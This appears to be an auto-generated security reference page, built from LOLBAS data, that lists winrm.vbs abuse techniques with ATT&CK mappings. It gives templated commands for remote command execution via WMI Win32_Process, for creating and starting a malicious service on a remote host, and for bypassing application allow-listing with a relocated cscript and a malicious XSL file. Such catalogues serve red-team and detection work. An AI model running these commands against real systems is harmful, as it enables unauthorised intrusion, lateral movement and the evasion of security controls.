---
parsed_by: focuslocust
source: commands
type: generated
---
# winrm.vbs Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## winrm.vbs

Tool page: [winrm.vbs](../../tools/windows/winrm.vbs.md)

### Proxy execution

```text
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
```

Description:

Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol

Related ATT&CK:

- [T1216](../../attack/techniques/T1216-system-script-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Winrm.yml` |
| Evidence | Command preserved from source parser. |

### Proxy execution

```text
winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
```

Description:

Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol

Related ATT&CK:

- [T1216](../../attack/techniques/T1216-system-script-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Winrm.yml` |
| Evidence | Command preserved from source parser. |

### Execute arbitrary, unsigned code via XSL script

```text
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
```

Description:

Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.

Related ATT&CK:

- [T1220](../../attack/techniques/T1220-xsl-script-processing.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Winrm.yml` |
| Evidence | Command preserved from source parser. |
